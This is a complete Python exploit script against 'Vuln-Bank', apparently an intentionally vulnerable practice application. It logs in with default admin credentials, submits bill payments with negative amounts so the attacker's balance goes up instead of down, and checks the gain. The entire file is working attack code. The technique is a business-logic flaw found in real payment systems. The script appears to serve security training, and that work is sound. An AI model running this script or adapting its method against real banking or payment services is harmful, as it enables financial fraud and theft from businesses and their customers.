#!/usr/bin/env python3
"""
Negative Bill Payment Exploit for Vuln-Bank

This script demonstrates a critical vulnerability in the bill payment functionality of Vuln-Bank
where the application doesn't validate if the payment amount is negative, allowing an attacker
to make negative bill payments that increase their balance instead of decreasing it.

Usage:
    python3 exploit.py [target_url]

Example:
    python3 exploit.py http://localhost:5000
"""

import requests
import json
import sys
import argparse
import time
from colorama import init, Fore, Style

# Initialize colorama for colored output
init()

def login(base_url, username="admin", password="admin123"):
    """
    Login to get a valid JWT token
    
    Args:
        base_url: The base URL of the vulnerable application
        username: Username to use for login
        password: Password to use for login
        
    Returns:
        tuple: (token, user_data) if login successful, (None, None) otherwise
    """
    print(f"{Fore.BLUE}[*] Logging in as {username}...{Style.RESET_ALL}")
    
    login_url = f"{base_url}/login"
    payload = {"username": username, "password": password}
    headers = {"Content-Type": "application/json"}
    
    try:
        response = requests.post(login_url, headers=headers, json=payload)
        
        if response.status_code == 200:
            data = response.json()
            token = data.get('token')
            if token:
                print(f"{Fore.GREEN}[+] Login successful! Got valid JWT token.{Style.RESET_ALL}")
                return (token, data)
            else:
                print(f"{Fore.RED}[-] Login successful but no token received.{Style.RESET_ALL}")
                return (None, None)
        else:
            print(f"{Fore.RED}[-] Login failed. Status code: {response.status_code}{Style.RESET_ALL}")
            print(f"{Fore.RED}[-] Response: {response.text}{Style.RESET_ALL}")
            return (None, None)
    except Exception as e:
        print(f"{Fore.RED}[-] Error during login: {str(e)}{Style.RESET_ALL}")
        return (None, None)

def get_billers(base_url, token):
    """
    Get a list of available billers
    
    Args:
        base_url: The base URL of the vulnerable application
        token: JWT token for authentication
        
    Returns:
        list: List of billers if successful, empty list otherwise
    """
    print(f"{Fore.BLUE}[*] Getting list of available billers...{Style.RESET_ALL}")
    
    billers_url = f"{base_url}/billers"
    headers = {"Authorization": f"Bearer {token}"}
    
    try:
        response = requests.get(billers_url, headers=headers)
        
        if response.status_code == 200:
            data = response.json()
            billers = data.get('billers', [])
            if billers:
                print(f"{Fore.GREEN}[+] Successfully retrieved {len(billers)} billers.{Style.RESET_ALL}")
                return billers
            else:
                print(f"{Fore.YELLOW}[!] No billers found.{Style.RESET_ALL}")
                return []
        else:
            print(f"{Fore.RED}[-] Failed to get billers. Status code: {response.status_code}{Style.RESET_ALL}")
            print(f"{Fore.RED}[-] Response: {response.text}{Style.RESET_ALL}")
            return []
    except Exception as e:
        print(f"{Fore.RED}[-] Error getting billers: {str(e)}{Style.RESET_ALL}")
        return []

def get_balance(base_url, token):
    """
    Get the current balance of the user
    
    Args:
        base_url: The base URL of the vulnerable application
        token: JWT token for authentication
        
    Returns:
        float: Current balance if successful, None otherwise
    """
    print(f"{Fore.BLUE}[*] Getting current balance...{Style.RESET_ALL}")
    
    profile_url = f"{base_url}/profile"
    headers = {"Authorization": f"Bearer {token}"}
    
    try:
        response = requests.get(profile_url, headers=headers)
        
        if response.status_code == 200:
            data = response.json()
            balance = data.get('balance')
            if balance is not None:
                print(f"{Fore.GREEN}[+] Current balance: {balance}{Style.RESET_ALL}")
                return float(balance)
            else:
                print(f"{Fore.RED}[-] Balance not found in response.{Style.RESET_ALL}")
                return None
        else:
            print(f"{Fore.RED}[-] Failed to get balance. Status code: {response.status_code}{Style.RESET_ALL}")
            print(f"{Fore.RED}[-] Response: {response.text}{Style.RESET_ALL}")
            return None
    except Exception as e:
        print(f"{Fore.RED}[-] Error getting balance: {str(e)}{Style.RESET_ALL}")
        return None

def make_negative_bill_payment(base_url, token, biller_id, amount):
    """
    Make a negative bill payment to increase the user's balance
    
    Args:
        base_url: The base URL of the vulnerable application
        token: JWT token for authentication
        biller_id: ID of the biller to pay
        amount: Negative amount to pay (should be negative)
        
    Returns:
        bool: True if successful, False otherwise
    """
    print(f"{Fore.BLUE}[*] Making negative bill payment of {amount} to biller {biller_id}...{Style.RESET_ALL}")
    
    payment_url = f"{base_url}/bill_payment"
    headers = {
        "Content-Type": "application/json",
        "Authorization": f"Bearer {token}"
    }
    
    payload = {
        "biller_id": biller_id,
        "amount": amount,  # Negative amount
        "payment_method": "balance",
        "description": "Exploiting negative bill payment vulnerability"
    }
    
    try:
        response = requests.post(payment_url, headers=headers, json=payload)
        
        if response.status_code == 200:
            data = response.json()
            print(f"{Fore.GREEN}[+] Bill payment successful!{Style.RESET_ALL}")
            print(f"{Fore.GREEN}[+] Response: {json.dumps(data, indent=2)}{Style.RESET_ALL}")
            return True
        else:
            print(f"{Fore.RED}[-] Bill payment failed. Status code: {response.status_code}{Style.RESET_ALL}")
            print(f"{Fore.RED}[-] Response: {response.text}{Style.RESET_ALL}")
            return False
    except Exception as e:
        print(f"{Fore.RED}[-] Error making bill payment: {str(e)}{Style.RESET_ALL}")
        return False

def main():
    parser = argparse.ArgumentParser(description='Negative Bill Payment Exploit for Vuln-Bank')
    parser.add_argument('target_url', nargs='?', default='http://localhost:5000', help='Target URL of the Vuln-Bank application')
    parser.add_argument('--username', default='admin', help='Username to use for login')
    parser.add_argument('--password', default='admin123', help='Password to use for login')
    parser.add_argument('--amount', type=float, default=-1000.0, help='Negative amount to pay (default: -1000.0)')
    args = parser.parse_args()
    
    base_url = args.target_url.rstrip('/')
    
    print(f"{Fore.YELLOW}=== Vuln-Bank Negative Bill Payment Exploit ==={Style.RESET_ALL}")
    print(f"{Fore.BLUE}[*] Target: {base_url}{Style.RESET_ALL}")
    
    # Login to get a token
    token, user_data = login(base_url, args.username, args.password)
    
    if not token:
        print(f"{Fore.RED}[-] Failed to get token. Exiting.{Style.RESET_ALL}")
        sys.exit(1)
    
    # Get initial balance
    initial_balance = get_balance(base_url, token)
    
    if initial_balance is None:
        print(f"{Fore.RED}[-] Failed to get initial balance. Exiting.{Style.RESET_ALL}")
        sys.exit(1)
    
    # Get billers
    billers = get_billers(base_url, token)
    
    if not billers:
        print(f"{Fore.YELLOW}[!] No billers found. Using default biller ID 1.{Style.RESET_ALL}")
        biller_id = 1
    else:
        biller_id = billers[0].get('id', 1)
        print(f"{Fore.GREEN}[+] Using biller ID: {biller_id}{Style.RESET_ALL}")
    
    # Make negative bill payment
    success = make_negative_bill_payment(base_url, token, biller_id, args.amount)
    
    if success:
        # Get new balance
        time.sleep(1)  # Wait a bit for the transaction to process
        new_balance = get_balance(base_url, token)
        
        if new_balance is not None:
            balance_increase = new_balance - initial_balance
            print(f"{Fore.GREEN}[+] Balance increased by {balance_increase}!{Style.RESET_ALL}")
            print(f"{Fore.GREEN}[+] Initial balance: {initial_balance}{Style.RESET_ALL}")
            print(f"{Fore.GREEN}[+] New balance: {new_balance}{Style.RESET_ALL}")
            
            if balance_increase > 0:
                print(f"{Fore.RED}[-] Vulnerability confirmed! Successfully exploited negative bill payment vulnerability.{Style.RESET_ALL}")
            else:
                print(f"{Fore.YELLOW}[!] Balance did not increase as expected. Vulnerability may not be exploitable.{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[-] Failed to get new balance.{Style.RESET_ALL}")
    
    print(f"\n{Fore.YELLOW}=== Summary of Findings ==={Style.RESET_ALL}")
    if success and new_balance is not None and new_balance > initial_balance:
        print(f"{Fore.RED}[-] Application is vulnerable to Negative Bill Payment Attack{Style.RESET_ALL}")
        print(f"{Fore.RED}[-] This is a critical vulnerability that allows attackers to increase their balance{Style.RESET_ALL}")
        print(f"{Fore.RED}[-] Balance increased by {new_balance - initial_balance}{Style.RESET_ALL}")
    else:
        print(f"{Fore.GREEN}[+] Application is not vulnerable to Negative Bill Payment Attack{Style.RESET_ALL}")
    
    print(f"\n{Fore.YELLOW}[!] Negative Bill Payment testing complete.{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
